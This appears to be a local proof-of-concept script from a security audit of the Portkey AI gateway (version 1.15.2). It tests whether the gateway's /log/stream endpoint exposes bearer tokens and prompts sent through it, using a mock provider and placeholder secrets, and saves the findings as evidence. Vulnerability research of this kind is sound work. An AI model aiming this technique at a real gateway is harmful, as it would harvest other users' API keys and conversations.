import http from "node:http";
import { spawn } from "node:child_process";
import { existsSync } from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { mkdir, writeFile } from "node:fs/promises";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const packageDir = path.join(__dirname, "package");
const gatewayPort = 8790;
const mockPort = 19030;
const gatewayBase = `http://127.0.0.1:${gatewayPort}`;
const secret = "SECRET-PROBE-LOCAL-ABC123";
const promptMarker = "PROMPT-PROBE-LOCAL-XYZ789";

function startMock() {
  const server = http.createServer(async (req, res) => {
    for await (const _chunk of req) {}
    res.writeHead(200, { "content-type": "application/json" });
    res.end(JSON.stringify({ id: "log-stream-local", choices: [{ message: { role: "assistant", content: "ok" } }] }));
  });
  return new Promise((resolve, reject) => {
    server.once("error", reject);
    server.listen(mockPort, "127.0.0.1", () => resolve(server));
  });
}

function startGateway() {
  const child = spawn(process.execPath, [path.join(packageDir, "build", "start-server.js"), `--port=${gatewayPort}`], {
    cwd: packageDir,
    env: { ...process.env, NODE_ENV: "development", NO_PROXY: "127.0.0.1,localhost", TRUSTED_CUSTOM_HOSTS: "127.0.0.1,localhost" },
    stdio: ["ignore", "pipe", "pipe"],
  });
  const logs = [];
  child.stdout.on("data", (data) => logs.push(data.toString()));
  child.stderr.on("data", (data) => logs.push(data.toString()));
  return { child, logs };
}

async function waitForGateway(logs) {
  const deadline = Date.now() + 20000;
  while (Date.now() < deadline) {
    try {
      const response = await fetch(`${gatewayBase}/`, { signal: AbortSignal.timeout(1000) });
      if (response.ok) return;
    } catch {}
    await new Promise((resolve) => setTimeout(resolve, 250));
  }
  throw new Error(`Gateway did not become ready\n${logs.join("")}`);
}

async function readUntil(reader, timeoutMs = 8000) {
  const deadline = Date.now() + timeoutMs;
  let text = "";
  while (Date.now() < deadline) {
    const remaining = Math.max(100, deadline - Date.now());
    const result = await Promise.race([
      reader.read(),
      new Promise((resolve) => setTimeout(() => resolve({ timeout: true }), remaining)),
    ]);
    if (result.timeout) break;
    if (result.done) break;
    text += Buffer.from(result.value).toString("utf8");
    if (text.includes(secret) && text.includes(promptMarker)) break;
  }
  return text;
}

let mock;
let gateway;
let streamResponse;
try {
  const publicIndex = path.join(packageDir, "build", "public", "index.html");
  if (!existsSync(publicIndex)) {
    await mkdir(path.dirname(publicIndex), { recursive: true });
    await writeFile(publicIndex, "<!doctype html><title>local security test</title>");
  }
  mock = await startMock();
  gateway = startGateway();
  await waitForGateway(gateway.logs);
  streamResponse = await fetch(`${gatewayBase}/log/stream`, { signal: AbortSignal.timeout(12000) });
  const reader = streamResponse.body.getReader();
  const requestPromise = fetch(`${gatewayBase}/v1/chat/completions`, {
    method: "POST",
    headers: {
      "content-type": "application/json",
      authorization: `Bearer ${secret}`,
      "x-portkey-provider": "openai",
      "x-portkey-custom-host": `http://127.0.0.1:${mockPort}`,
    },
    body: JSON.stringify({ model: "gpt-4o-mini", messages: [{ role: "user", content: promptMarker }] }),
    signal: AbortSignal.timeout(10000),
  });
  const [requestResponse, logText] = await Promise.all([requestPromise.then(async (r) => ({ status: r.status, body: await r.text() })), readUntil(reader)]);
  const result = {
    package: "@portkey-ai/gateway@1.15.2",
    logStreamStatus: streamResponse.status,
    requestResponse,
    secretFound: logText.includes(secret),
    promptMarkerFound: logText.includes(promptMarker),
    secretOccurrences: logText.split(secret).length - 1,
    promptOccurrences: logText.split(promptMarker).length - 1,
    logSample: logText.slice(0, 12000),
    gatewayLogs: gateway.logs.join("").slice(-6000),
  };
  const outputDir = path.join(__dirname, "..", "evidence");
  await mkdir(outputDir, { recursive: true });
  const resultPath = path.join(outputDir, `log-stream-exposure-${Date.now()}.json`);
  await writeFile(resultPath, JSON.stringify({ generatedAt: new Date().toISOString(), ...result }, null, 2));
  console.log(JSON.stringify({ resultPath, summary: { logStreamStatus: result.logStreamStatus, requestStatus: requestResponse.status, secretFound: result.secretFound, promptMarkerFound: result.promptMarkerFound, secretOccurrences: result.secretOccurrences, promptOccurrences: result.promptOccurrences } }, null, 2));
} finally {
  try { await streamResponse?.body?.cancel(); } catch {}
  if (gateway?.child && !gateway.child.killed) gateway.child.kill();
  if (mock) await new Promise((resolve) => mock.close(resolve));
}
